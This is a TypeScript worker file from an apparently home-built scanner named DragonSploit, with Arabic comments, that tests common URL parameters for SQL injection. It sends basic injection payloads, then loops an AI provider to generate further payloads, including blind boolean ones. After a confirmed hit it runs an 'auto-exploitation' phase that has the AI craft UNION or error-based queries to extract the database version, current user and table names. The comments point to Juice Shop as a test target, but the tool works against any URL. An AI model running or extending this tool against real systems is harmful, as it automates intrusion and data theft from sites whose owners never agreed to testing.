// backend/src/worker/jobs/sqli.ts (النسخة النهائية والمصححة)

import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { AIProvider } from '../../services/ai-provider'; // ✅ Import AIProvider
import { ALL_SQL_ERROR_SIGNATURES } from '../sqli/signatures'; // تأكد من أن المسار صحيح
import { URL } from 'url';
import axios from 'axios';

// --- دوال مساعدة (من الكود الذي أرسلته) ---
const delay = (ms: number) => new Promise(res => setTimeout(res, ms));

async function executeRequest(urlToTest: string) {
    const startTime = Date.now();
    const response = await axios.get(urlToTest, {
        timeout: 15000,
        headers: { 'User-Agent': 'DragonSploit/2.0' },
        validateStatus: () => true,
    });
    const responseTime = Date.now() - startTime;
    const responseBody = (typeof response.data === 'string' || Buffer.isBuffer(response.data))
        ? response.data.toString()
        : JSON.stringify(response.data);
    return { response, responseTime, responseBody };
}

async function recordVulnerability(prisma: PrismaClient, scanId: string, type: VulnerabilityType, severity: Severity, description: string, proof: string) {
    try {
        await prisma.vulnerability.create({ data: { scanId, type, severity, description, proof } });
        console.log("✅ Vulnerability successfully recorded in the database.");
        return true;
    } catch (error: any) {
        console.error(`❌ CRITICAL: Failed to record vulnerability. Error: ${error.message}`);
        return false;
    }
}

// --- الثوابت ---
const MAX_ATTEMPTS_PER_PARAM = 10;
const COMMON_FALLBACK_PARAMS = ['id', 'q', 'search', 'query', 'page', 'category', 'item', 'view'];
const BASIC_SIGNATURE_PAYLOADS = ["'", "\"", "1' OR 1=1--"];


/**
 * دالة معالجة المهمة الرئيسية لـ SQLi
 */
export const processSqliJob = async (job: Job, prisma: PrismaClient): Promise<void> => {
    const { targetUrl, scanId } = job.data;
    console.log(`[SQLi Worker] Starting COMPREHENSIVE DISCOVERY for job ${job.id}`);

    let foundVulnerability = false;

    for (const param of COMMON_FALLBACK_PARAMS) {
        console.log(`\n--- Testing Parameter: [${param}] ---`);

        // الخطوة 1: الفحص السريع (Quick Win)
        let quickWinFound = false;
        for (const basicPayload of BASIC_SIGNATURE_PAYLOADS) {
            try {
                const testUrl = new URL(targetUrl);
                testUrl.searchParams.set(param, basicPayload);
                const { responseBody } = await executeRequest(testUrl.toString());
                const foundSignature = ALL_SQL_ERROR_SIGNATURES.find(sig => responseBody.toLowerCase().includes(sig.toLowerCase()));
                if (foundSignature) {
                    console.log(`\n✅✅✅ Quick Win! VULNERABILITY CONFIRMED: Signature-Based SQLi ✅✅✅`);
                    const proof = `Basic Payload: ${basicPayload}\nSignature: ${foundSignature}\nURL: ${testUrl}`;
                    const description = `Signature-based SQL Injection confirmed in '${param}' with basic payload.`;
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, description, proof);
                    quickWinFound = true;
                    foundVulnerability = true;
                    break;
                }
            } catch (e) { /* تجاهل الأخطاء في هذه المرحلة السريعة */ }
        }
        if (quickWinFound) continue;

        // الخطوة 2: التصعيد إلى الذكاء الاصطناعي (Deep Scan)
        console.log(`[Hybrid] Escalating to Conversational AI for deep scan on '${param}'...`);

        // 2. رسالة البدء الآمنة والموحدة
        let feedback = `Begin analysis on parameter '${param}'. Acknowledge your role and provide the first payload as instructed by your directives (Phase 1).`;
        let aiFinished = false;
        let attempts = 0;

        while (attempts < MAX_ATTEMPTS_PER_PARAM && !aiFinished) {
            attempts++;
            console.log(`\n[Deep Scan Attempt #${attempts} on '${param}']`);

            if (attempts > 1) {
                console.log(`[Throttling] Waiting for 6 seconds...`);
                await delay(6000);
            }

            // ✅ USE UNIFIED AI PROVIDER (Ollama)
            const fingerprint = {
                server: 'Express', // Detected or Default
                language: 'Node.js', // Detected or Default
                database: 'SQLite', // Detected or Default (Juice Shop)
                orm: 'Sequelize' // Detected or Default
            };

            const { payload, reasoning, mode, finished } = await AIProvider.getPayload(feedback, {
                vector: 'sqli',
                parameter: param,
                attemptNumber: attempts,
                targetUrl: targetUrl,
                fingerprint: fingerprint
            });

            aiFinished = finished;

            console.log(`[AI Reasoning] ${reasoning}`);
            if (mode) console.log(`[AI Mode] ${mode}`);
            if (aiFinished || !payload) {
                console.log(`[AI decided to end attempt on param '${param}']`);
                break;
            }
            console.log(`[AI suggested payload: "${payload}"]`);

            try {
                const testUrl = new URL(targetUrl);
                testUrl.searchParams.set(param, payload);
                const { response, responseBody, responseTime } = await executeRequest(testUrl.toString());

                const errorSignature = ALL_SQL_ERROR_SIGNATURES.find(sig => responseBody.toLowerCase().includes(sig.toLowerCase()));

                // 3. توليد التغذية الراجعة المحسنة (Smart Feedback)
                feedback = `Target responded to '${payload}' with: Status=${response.status}, Time=${responseTime.toFixed(0)}ms, Length=${responseBody.length}, Error='${errorSignature || 'None'}'`;

                // 💡 HINT FOR BLIND SQLI
                if (response.status === 200 && !errorSignature) {
                    feedback += `\n[HINT] Status is 200 OK with no error. This might be Blind SQLi. You MUST try Boolean Inference (AND 1=1 vs AND 1=2) to verify.`;
                }

                // الكشف عن النجاح
                if (errorSignature || responseBody.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)|(root@localhost)|(@@version)/i)) {
                    console.log(`[AI-driven Scan] ✅ VULNERABILITY CONFIRMED!`);

                    // 🚀 AUTO-EXPLOITATION PHASE
                    console.log(`[Exploitation] Starting data extraction phase...`);
                    let exploitationProof = "";

                    try {
                        const extractionTargets = ["Database Version", "Current User", "Table Names"];
                        for (const target of extractionTargets) {
                            console.log(`[Exploitation] Attempting to extract: ${target}`);
                            const exploitPrompt = `VULNERABILITY CONFIRMED on parameter '${param}' with payload: "${payload}".
                            TASK: Generate a payload to EXTRACT: ${target}.
                            Use UNION SELECT or Error-Based Injection.
                            Return JSON: {"payload": "...", "reasoning": "..."}`;

                            const exploitResult = await AIProvider.getPayload(exploitPrompt, {
                                vector: 'sqli-exploitation',
                                parameter: param,
                                targetUrl: targetUrl
                            });

                            if (exploitResult.payload) {
                                console.log(`[Exploitation] AI suggested: ${exploitResult.payload}`);
                                const exploitUrl = new URL(targetUrl);
                                exploitUrl.searchParams.set(param, exploitResult.payload);
                                const { responseBody: exploitBody } = await executeRequest(exploitUrl.toString());

                                // Simple heuristic to capture relevant data (first 200 chars if short, or specific patterns)
                                const capturedData = exploitBody.length < 500 ? exploitBody : exploitBody.substring(0, 200) + "...";
                                exploitationProof += `\n[${target}]: ${capturedData}`;
                            }
                        }
                    } catch (ex) {
                        console.error(`[Exploitation] Failed:`, ex);
                    }

                    let proof = `Payload: ${payload}\nAI Reasoning: ${reasoning}\nResponse Snippet: ${responseBody.substring(0, 200)}...`;
                    if (exploitationProof) {
                        proof += `\n\n--- AUTO-EXPLOITATION DATA ---${exploitationProof}`;
                    }

                    const description = `AI-driven SQLi in '${param}'. Vulnerability confirmed and data extraction attempted.`;
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
                    foundVulnerability = true;
                    break;
                }
            } catch (error: any) {
                feedback = `Execution of '${payload}' failed with client-side error: ${error.message}. Suggest an alternative.`;
            }
        }
    }

    // تحديث حالة الفحص في النهاية
    await prisma.scan.update({
        where: { id: scanId },
        data: { status: 'COMPLETED', completedAt: new Date() },
    });
    console.log(`[SQLi Worker] Finished all attack phases for job ${job.id}.`);
};
